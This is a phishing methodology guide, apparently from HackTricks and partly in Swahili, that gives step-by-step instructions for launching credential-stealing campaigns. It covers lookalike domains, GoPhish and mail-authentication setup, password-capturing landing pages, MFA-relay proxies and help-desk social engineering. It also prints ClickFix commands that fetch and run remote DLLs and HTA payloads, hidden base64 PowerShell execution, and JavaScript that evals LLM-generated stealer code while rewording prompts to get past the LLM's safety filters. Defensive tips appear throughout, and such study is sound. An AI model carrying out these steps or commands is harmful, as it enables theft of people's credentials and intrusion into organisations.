# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Methodology

1. Recon the victim
1. Select the **victim domain**.
2. Perform some basic web enumeration **searching for login portals** used by the victim and **decide** which one you will **impersonate**.
3. Use some **OSINT** to **find emails**.
2. Prepare the environment
1. **Buy the domain** you are going to use for the phishing assessment
2. **Configure the email service** related records (SPF, DMARC, DKIM, rDNS)
3. Configure the VPS with **gophish**
3. Prepare the campaign
1. Prepare the **email template**
2. Prepare the **web page** to steal the credentials
4. Launch the campaign!

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword**: The domain name **contains** an important **keyword** of the original domain (e.g., zelster.com-management.com).
- **hypened subdomain**: Change the **dot for a hyphen** of a subdomain (e.g., www-zelster.com).
- **New TLD**: Same domain using a **new TLD** (e.g., zelster.org)
- **Homoglyph**: It **replaces** a letter in the domain name with **letters that look similar** (e.g., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** It **swaps two letters** within the domain name (e.g., zelsetr.com).
- **Singularization/Pluralization**: Adds or removes “s” at the end of the domain name (e.g., zeltsers.com).
- **Omission**: It **removes one** of the letters from the domain name (e.g., zelser.com).
- **Repetition:** It **repeats one** of the letters in the domain name (e.g., zeltsser.com).
- **Replacement**: Like homoglyph but less stealthy. It replaces one of the letters in the domain name, perhaps with a letter in proximity of the original letter on the keyboard (e.g, zektser.com).
- **Subdomained**: Introduce a **dot** inside the domain name (e.g., ze.lster.com).
- **Insertion**: It **inserts a letter** into the domain name (e.g., zerltser.com).
- **Missing dot**: Append the TLD to the domain name. (e.g., zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

There is a **possibility that one of some bits stored or in communication might get automatically flipped** due to various factors like solar flares, cosmic rays, or hardware errors.

When this concept is **applied to DNS requests**, it is possible that the **domain received by the DNS server** is not the same as the domain initially requested.

For example, a single bit modification in the domain "windows.com" can change it to "windnws.com."

Attackers may **take advantage of this by registering multiple bit-flipping domains** that are similar to the victim's domain. Their intention is to redirect legitimate users to their own infrastructure.

For more information read [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Buy a trusted domain

You can search in [https://www.expireddomains.net/](https://www.expireddomains.net) for a expired domain that you could use.\
In order to make sure that the expired domain that you are going to buy **has already a good SEO** you could search how is it categorized in:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Discovering Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

In order to **discover more** valid email addresses or **verify the ones** you have already discovered you can check if you can brute-force them smtp servers of the victim. [Learn how to verify/discover email address here](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Moreover, don't forget that if the users use **any web portal to access their mails**, you can check if it's vulnerable to **username brute force**, and exploit the vulnerability if possible.

## Configuring GoPhish

### Installation

You can download it from [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Download and decompress it inside `/opt/gophish` and execute `/opt/gophish/gophish`\
You will be given a password for the admin user in port 3333 in the output. Therefore, access that port and use those credentials to change the admin password. You may need to tunnel that port to local:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Configuration

**Usanidi wa cheti cha TLS**

Kabla ya hatua hii unapaswa kuwa **tayari umenunua domain** utakayotumia na lazima iwe **inaelekeza** kwenye **IP ya VPS** ambapo unasanidi **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Usanidi wa Mail**

Anza kusakinisha: `apt-get install postfix`

Kisha ongeza domain kwenye faili zifuatazo:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Badilisha pia thamani za vigezo vifuatavyo ndani ya /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Mwishowe rekebisha faili **`/etc/hostname`** na **`/etc/mailname`** ziwe na jina lako la domain na **anzisha upya VPS yako.**

Sasa, tengeneza **DNS A record** ya `mail.<domain>` inayoelekeza kwenye **ip address** ya VPS na **DNS MX** record inayoelekeza kwenye `mail.<domain>`

Sasa hebu tujaribu kutuma email:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Usanidi wa Gophish**

Simamisha utekelezaji wa gophish na tuiweke.\
Badilisha `/opt/gophish/config.json` iwe ifuatayo (kumbuka matumizi ya https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Sanidi huduma ya gophish**

Ili kuunda huduma ya gophish ili iweze kuanzishwa kiotomatiki na kudhibitiwa kama huduma unaweza kuunda faili `/etc/init.d/gophish` yenye maudhui yafuatayo:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Maliza kusanidi service na kuikagua kwa kufanya:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Kusanidi mail server na domain

### Subiri na uwe legit

Kadiri domain inavyozeeka ndivyo inavyokuwa na uwezekano mdogo wa kugunduliwa kama spam. Kisha unapaswa kusubiri muda mrefu kadri inavyowezekana (angalau wiki 1) kabla ya phishing assessment. Zaidi ya hayo, ukiweka page kuhusu sector yenye reputation, reputation itakayopatikana itakuwa bora zaidi.

Kumbuka kwamba hata kama inabidi usubiri wiki moja unaweza kumaliza kusanidi kila kitu sasa.

### Configure Reverse DNS (rDNS) record

Weka rDNS (PTR) record ambayo inaresolve IP address ya VPS kwenda kwenye domain name.

### Sender Policy Framework (SPF) Record

Lazima **uconfigure SPF record kwa domain mpya**. Kama hujui SPF record ni nini [**soma page hii**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Unaweza kutumia [https://www.spfwizard.net/](https://www.spfwizard.net) kutengeneza SPF policy yako (tumia IP ya VPS machine)

![SPF Wizard form for generating an SPF record for a phishing domain](<../../images/image (1037).png>)

Huu ndio maudhui yanayopaswa kuwekwa ndani ya TXT record ndani ya domain:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Rekodi ya Domain-based Message Authentication, Reporting & Conformance (DMARC)

Lazima **usanidi rekodi ya DMARC kwa domain mpya**. Kama hujui DMARC record ni nini, [**soma ukurasa huu**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Lazima uunde rekodi mpya ya DNS TXT inayoelekeza hostname `_dmarc.<domain>` yenye maudhui yafuatayo:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Lazima **usanidi DKIM kwa ajili ya domain mpya**. Kama hujui record ya DMARC ni nini [**soma ukurasa huu**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Mafunzo haya yanategemea: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> Unahitaji kuunganisha thamani zote mbili za B64 ambazo DKIM key huzalisha:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Jaribu alama ya usanidi wako wa barua pepe

Unaweza kufanya hivyo kwa kutumia [https://www.mail-tester.com/](https://www.mail-tester.com)\
Fungua ukurasa na utume barua pepe kwenda kwenye anwani wanayokupa:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Unaweza pia **kuangalia usanidi wa barua pepe yako** kwa kutuma barua pepe kwenda `check-auth@verifier.port25.com` na **kusoma jibu** (kwa hili utahitaji **kufungua** port **25** na kuona jibu katika faili _/var/mail/root_ ikiwa utatuma barua pepe kama root).\
Hakiki kwamba unapitisha majaribio yote:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Unaweza pia kutuma **message kwa Gmail iliyo chini ya udhibiti wako**, na uangalie **headers za email** kwenye Gmail inbox yako, `dkim=pass` inapaswa kuwepo kwenye field ya `Authentication-Results` header.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Removing from Spamhouse Blacklist

The page [www.mail-tester.com](https://www.mail-tester.com) inaweza kukuonyesha ikiwa domain yako inazuiwa na spamhouse. Unaweza kuomba domain/IP yako iondolewe kwenye: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Removing from Microsoft Blacklist

​​Unaweza kuomba domain/IP yako iondolewe kwenye [https://sender.office.com/](https://sender.office.com).

## Create & Launch GoPhish Campaign

### Sending Profile

- Weka **jina la kutambua** profile ya mtumaji
- Amua kutoka akaunti gani utatuma phishing emails. Mapendekezo: _noreply, support, servicedesk, salesforce..._
- Unaweza kuacha username na password tupu, lakini hakikisha umechagua Ignore Certificate Errors

![Create & Launch GoPhish Campaign - Sending Profile: You can leave blank the username and password, but make sure to check the Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Inapendekezwa kutumia utendaji wa "**Send Test Email**" ili kujaribu kwamba kila kitu kinafanya kazi.\
> Ningependekeza **kutuma test emails kwa anwani za 10min mails** ili kuepuka kuingia blacklist wakati wa majaribio.

### Email Template

- Weka **jina la kutambua** template
- Kisha andika **subject** (si kitu cha ajabu, tu kitu ambacho ungeweza kutarajia kusoma kwenye email ya kawaida)
- Hakikisha umechagua "**Add Tracking Image**"
- Andika **email template** (unaweza kutumia variables kama kwenye mfano ufuatao):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Note kwamba **ili kuongeza uaminifu wa email**, inapendekezwa kutumia signature fulani kutoka kwenye email ya mteja. Mapendekezo:

- Tuma email kwa **anwani isiyopo** na kisha angalia kama response ina signature yoyote.
- Tafuta **public emails** kama info@ex.com au press@ex.com au public@ex.com na utume email, kisha subiri response.
- Jaribu kuwasiliana na **email fulani halali iliyogunduliwa** na subiri response

![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)

> [!TIP]
> Email Template pia inaruhusu **kuambatisha files za kutuma**. Ikiwa pia ungependa kuiba NTLM challenges kwa kutumia baadhi ya specially crafted files/documents [soma ukurasa huu](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Andika **jina**
- **Andika HTML code** ya web page. Kumbuka kuwa unaweza **kuimport** web pages.
- Weka alama **Capture Submitted Data** na **Capture Passwords**
- Weka **redirection**

![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Kwa kawaida utahitaji kurekebisha HTML code ya page na kufanya majaribio local (labda ukitumia Apache server fulani) **mpaka uridhike na matokeo.** Kisha, andika HTML code hiyo kwenye box.\
> Kumbuka kwamba ukihitaji **kutumia static resources fulani** kwa HTML (labda baadhi ya CSS na JS pages) unaweza kuzihifadhi katika _**/opt/gophish/static/endpoint**_ na kisha kuzifikia kupitia _**/static/\<filename>**_

> [!TIP]
> Kwa redirection unaweza **kuwaredirect users kwenye legit main web page** ya victim, au kuwaredirect kwenda _/static/migration.html_ kwa mfano, weka **spinning wheel (**[**https://loading.io/**](https://loading.io)**) kwa sekunde 5 kisha uonyeshe kwamba process imefanikiwa**.

### Users & Groups

- Weka jina
- **Import the data** (kumbuka kwamba ili kutumia template kwa mfano unahitaji firstname, last name na email address ya kila user)

![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)

### Campaign

Hatimaye, tengeneza campaign kwa kuchagua jina, email template, landing page, URL, sending profile na group. Kumbuka kwamba URL itakuwa link inayotumwa kwa victims

Kumbuka kwamba **Sending Profile inaruhusu kutuma test email ili kuona jinsi final phishing email itakavyoonekana**:

![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)

> [!TIP]
> Ningependekeza **kutuma test emails kwa anwani za 10min mails** ili kuepuka kuwekewa blacklist wakati wa kufanya majaribio.

Mara kila kitu kiko tayari, anzisha tu campaign!

## Website Cloning

Ikiwa kwa sababu yoyote unataka kuclone website, angalia ukurasa ufuatao:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

Katika baadhi ya phishing assessments (hasa kwa Red Teams) utataka pia **kutuma files zenye aina fulani ya backdoor** (labda C2 au labda tu kitu kitakachochochea authentication).\
Angalia ukurasa ufuatao kwa mifano baadhi:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Attack ya awali ni ya werevu sana kwa sababu unaiga real website na kukusanya taarifa zilizoingizwa na user. Kwa bahati mbaya, ikiwa user hakuweka password sahihi au ikiwa application uliyoiga imeconfigiwa na 2FA, **taarifa hizi hazitakuruhusu kujifanya kuwa user aliyedanganywa**.

Hapa ndipo tools kama [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) na [**muraena**](https://github.com/muraenateam/muraena) zinapokuwa muhimu. Tool hii itakuruhusu kutengeneza attack ya aina ya MitM. Kimsingi, attacks hufanya kazi kwa njia ifuatayo:

1. Una **iga login** form ya real webpage.
2. User **anatuma** **credentials** zake kwenye fake page yako na tool inatuma hizo kwenda real webpage, **ikiangalia kama credentials zinafanya kazi**.
3. Ikiwa account imeconfigiwa na **2FA**, MitM page itaomba hiyo na mara user **anapoingiza** tool itaituma kwenye real web page.
4. Mara user akithibitishwa wewe (kama attacker) utakuwa umekamata **credentials, 2FA, cookie na taarifa zozote** za kila interaction yako wakati tool inafanya MitM.

### Via VNC

Vipi ikiwa badala ya **kumtuma victim kwenye malicious page** yenye muonekano sawa na wa asili, unamtuma kwenye **VNC session yenye browser iliyounganishwa na real web page**? Utaweza kuona anachofanya, kuiba password, MFA iliyotumiwa, cookies...\
Unaweza kufanya hivi kwa [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)

## Detecting the detection

Ni wazi kuwa mojawapo ya njia bora za kujua kama umebainika ni **kutafuta domain yako ndani ya blacklists**. Iwapo inaonekana imeorodheshwa, kwa namna fulani domain yako iligunduliwa kuwa ya kushukiwa.\
Njia rahisi ya kuangalia kama domain yako inaonekana katika blacklist yoyote ni kutumia [https://malwareworld.com/](https://malwareworld.com)

Hata hivyo, zipo njia nyingine za kujua kama victim **anaangalia kikamilifu suspicious phishing activity in the wild** kama ilivyoelezwa katika:


{{#ref}}
detecting-phising.md
{{#endref}}

Unaweza **kununua domain yenye jina linalofanana sana** na domain ya victims **na/au kutengeneza certificate** kwa ajili ya **subdomain** ya domain inayodhibitiwa na wewe **yenye** **keyword** ya domain ya victim. Ikiwa **victim** atafanya aina yoyote ya **DNS au HTTP interaction** nazo, utajua kuwa **anaangalia kikamilifu** domains za kushukiwa na utahitaji kuwa stealth sana.

### Evaluate the phishing

Tumia [**Phishious** ](https://github.com/Rices/Phishious)kutathmini kama email yako itaishia kwenye spam folder au itazuiwa au kufanikiwa.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Modern intrusion sets zinazidi kuruka email lures kabisa na **kulenga moja kwa moja service-desk / identity-recovery workflow** ili kushinda MFA.  Attack hii ni fully "living-off-the-land": mara operator anapomiliki valid credentials, hupitia kwa built-in admin tooling – hakuna malware inayohitajika.

### Attack flow
1. Recon victim
* Kusanya personal & corporate details kutoka LinkedIn, data breaches, public GitHub, n.k.
* Tambua high-value identities (executives, IT, finance) na orodhesha **exact help-desk process** ya password / MFA reset.
2. Real-time social engineering
* Piga simu, Teams au chat help-desk ukiigiza target (mara nyingi kwa **spoofed caller-ID** au **cloned voice**).
* Toa PII iliyokusanywa awali ili kupita knowledge-based verification.
* Mshawishi agent **a-reset MFA secret** au afanye **SIM-swap** kwenye registered mobile number.
3. Immediate post-access actions (≤60 min in real cases)
* Anzisha foothold kupitia web SSO portal yoyote.
* Orodhesha AD / AzureAD kwa kutumia built-ins (hakuna binaries zinazoachwa):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Lateral movement kwa **WMI**, **PsExec**, au legitimate **RMM** agents ambazo tayari zimewhitelistwa kwenye environment.

### Detection & Mitigation
* Chukulia help-desk identity recovery kama **privileged operation** – hitaji step-up auth & manager approval.
* Deploy **Identity Threat Detection & Response (ITDR)** / **UEBA** rules zinazoonya kuhusu:
* MFA method changed + authentication kutoka device / geo mpya.
* Immediate elevation ya principal huyo huyo (user-→-admin).
* Rekodi simu za help-desk na shurutisha **call-back kwenda kwenye number iliyosajiliwa tayari** kabla ya reset yoyote.
* Tekeleza **Just-In-Time (JIT) / Privileged Access** ili accounts zilizorejeshwa upya zisipokee moja kwa moja high-privilege tokens.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crews hufidia gharama za high-touch ops kwa mass attacks zinazogeuza **search engines & ad networks kuwa delivery channel**.

1. **SEO poisoning / malvertising** husukuma fake result kama `chromium-update[.]site` hadi juu ya search ads.
2. Victim hupakua small **first-stage loader** (mara nyingi JS/HTA/ISO).  Mifano iliyoonekana na Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader hutoa browser cookies + credential DBs, kisha huvuta **silent loader** ambayo huamua – *kwa realtime* – kama itapeleka:
* RAT (e.g. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* Zuia domains mpya zilizosajiliwa & tekeleza **Advanced DNS / URL Filtering** kwenye *search-ads* pamoja na e-mail.
* Zuia software installation kwa signed MSI / Store packages, kataa utekelezaji wa `HTA`, `ISO`, `VBS` kwa policy.
* Fuatilia child processes za browsers zinazofungua installers:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Tafuta LOLBins zinazotumiwa mara kwa mara vibaya na first-stage loaders (e.g. `regsvr32`, `curl`, `mshta`).

### Download-button click hijacking with TDS handoff
Baadhi ya fake software portals huacha visible download `href` ikielekeza kwenye **real** GitHub/release URL lakini hu-hijack **first** user interaction katika JavaScript na kumpeleka victim kwenye **Traffic Distribution System (TDS)** chain badala yake.
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Ciri muhimu:
- Hook kawaida huendeshwa katika **capture phase** (`true`) kwenye `document`, hivyo huanza kabla ya site handlers.
- Chrome mara nyingi hutumia `mousedown` badala ya `click` ili kuunganisha redirect na halali **user gesture** na kuboresha bypass ya popup-blocker.
- Baadhi ya variants hufungua mapema `about:blank` au kuunda `'<a target="_blank">'` clicks kisha baadaye huweka TDS URL.
- Browser-side caps kwa kawaida huwekwa ndani ya `localStorage`, hivyo **first click** inaweza kufikia malware wakati refreshes/retries hurudi kwenye visible link inayoonekana kuwa benign.
- TDS inaweza kufanya gate kwa referrer, entry domain, GEO, browser/device fingerprint, VPN/datacenter checks, click context, na per-session counters, na kufanya analyst replays kuwa non-deterministic.

Mawazo ya defender:
- Linganisha `href` iliyoonyeshwa na target halisi ya navigation inayozalishwa wakati wa click.
- Tafuta `document.addEventListener(..., true)` handlers zinazopiga zote `preventDefault()` na `stopImmediatePropagation()` karibu na `window.open`, `about:blank`, au synthetic anchor clicks.
- Tumia clusters za newly registered software-download domains ambazo zote hupakia CloudFront/JS stage ileile kama high-signal SEO-poisoning/TDS pattern.

### ClickFix from fake verification pages + archive-looking LOLBAS fetches
Baadhi ya TDS branches huishia kwenye fake verification page (mtindo wa Cloudflare/IUAM) ambayo humwambia mwathirika aendeshe trusted Windows binary kama vile:
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Notes:
- `mshta.exe` hutekeleza **HTA/VBScript mwanzoni mwa jibu**, hata kama URL inajifanya kuwa kumbukumbu ya `.7z`; data ya archive iliyoambatishwa inaweza kuwa decoy tu.
- Hatua zinazofuata mara nyingi huendelea kudanganya kuhusu aina ya faili (`.rtf` kwa PowerShell, `.asar` kwa Python, ZIPs zenye binaries zilizopachikwa padding) kisha hubadilika kwenda **manual PE mapping / in-memory execution**.
- Ikiwa unajibu mojawapo ya minyororo hii, hifadhi **network + memory kutoka run ya kwanza iliyofanikiwa**: replay za baadaye zinaweza kuonyesha tu njia isiyo na madhara ya installer/SFX au kushindwa kwa sababu payload/key release ilikuwa imefungwa kwa session ya asili ya TDS.

### ClickFix DLL delivery tradecraft (fake CERT update)
* Lure: advisory ya CERT ya kitaifa iliyonakiliwa yenye kitufe cha **Update** kinachoonyesha maelekezo ya “fix” ya hatua kwa hatua. Waathiriwa huambiwa waendeshe batch ambayo inashusha DLL na kuitekeleza kupitia `rundll32`.
* Typical batch chain observed:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` huweka payload kwenye `%TEMP%`, usingizi mfupi huficha network jitter, kisha `rundll32` huita exported entrypoint (`notepad`).
* DLL hu-beacon utambulisho wa host na ku-poll C2 kila baada ya dakika chache. Remote tasking huja kama **base64-encoded PowerShell** inayotekelezwa ikiwa imefichwa na kwa policy bypass:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Hii huhifadhi C2 flexibility (server inaweza kubadilisha tasks bila kusasisha DLL) na huficha console windows. Tafuta watoto wa PowerShell wa `rundll32.exe` wakitumia `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` pamoja.
* Defenders wanaweza kutafuta HTTP(S) callbacks za umbo `...page.php?tynor=<COMPUTER>sss<USER>` na vipindi vya polling vya dakika 5 baada ya DLL kupakiwa.

---

## AI-Enhanced Phishing Operations
Washambuliaji sasa huunganisha **LLM & voice-clone APIs** kwa lures zilizobinafsishwa kikamilifu na mwingiliano wa wakati halisi.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|Generate & send >100 k emails / SMS with randomised wording & tracking links.|
|Generative AI|Produce *one-off* emails referencing public M&A, inside jokes from social media; deep-fake CEO voice in callback scam.|
|Agentic AI|Autonomously register domains, scrape open-source intel, craft next-stage mails when a victim clicks but doesn’t submit creds.|

**Defence:**
• Ongeza **dynamic banners** zinazoangazia ujumbe uliotumwa kutoka automation isiyoaminika (kupitia ARC/DKIM anomalies).
• Tumia **voice-biometric challenge phrases** kwa maombi ya simu yenye hatari kubwa.
• Endelea kuiga lures zinazotokana na AI katika awareness programmes – static templates zimepitwa na wakati.

See also – agentic browsing abuse for credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

See also – AI agent abuse of local CLI tools and MCP (for secrets inventory and detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Washambuliaji wanaweza kutuma HTML inayoonekana kuwa salama na **kuzalisha stealer wakati wa runtime** kwa kumuuliza **trusted LLM API** kwa JavaScript, kisha kuitekeleza ndani ya browser (kwa mfano, `eval` au dynamic `<script>`).

1. **Prompt-as-obfuscation:** encode exfil URLs/Base64 strings kwenye prompt; badilisha wording mara kwa mara ili kupita safety filters na kupunguza hallucinations.
2. **Client-side API call:** wakati wa load, JS huita public LLM (Gemini/DeepSeek/etc.) au CDN proxy; prompt/API call pekee ndiyo ipo kwenye static HTML.
3. **Assemble & exec:** unganisha response na uitekeleze (polymorphic kwa kila visit):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** code iliyozalishwa hulibinafsisha mtego (mfano, uchanganuzi wa token ya LogoKit) na kutuma creds kwenda endpoint iliyofichwa kwenye prompt.

**Sifa za evasion**
- Trafiki hupiga domains zinazojulikana za LLM au trusted CDN proxies; wakati mwingine kupitia WebSockets kwenda backend.
- Hakuna static payload; malicious JS ipo tu baada ya render.
- Non-deterministic generations huzalisha **unique** stealers kwa kila session.

**Detection ideas**
- Endesha sandboxes zikiwa na JS imewezeshwa; weka alama **runtime `eval`/dynamic script creation iliyotokana na LLM responses**.
- Tafuta front-end POSTs kwenda LLM APIs ambazo mara moja hufuatwa na `eval`/`Function` kwenye text iliyorejeshwa.
- Toa alert kwenye unsanctioned LLM domains kwenye client traffic pamoja na credential POSTs zinazofuata.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Mbali na classic push-bombing, operators simply **force a new MFA registration** during the help-desk call, hivyo kumfanya token iliyokuwapo ya mtumiaji kuwa batili.  Any subsequent login prompt inaonekana kuwa halali kwa victim.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Fuatilie matukio ya AzureAD/AWS/Okta ambapo **`deleteMFA` + `addMFA`** hutokea **ndani ya dakika chache kutoka IP ile ile**.



## Clipboard Hijacking / Pastejacking

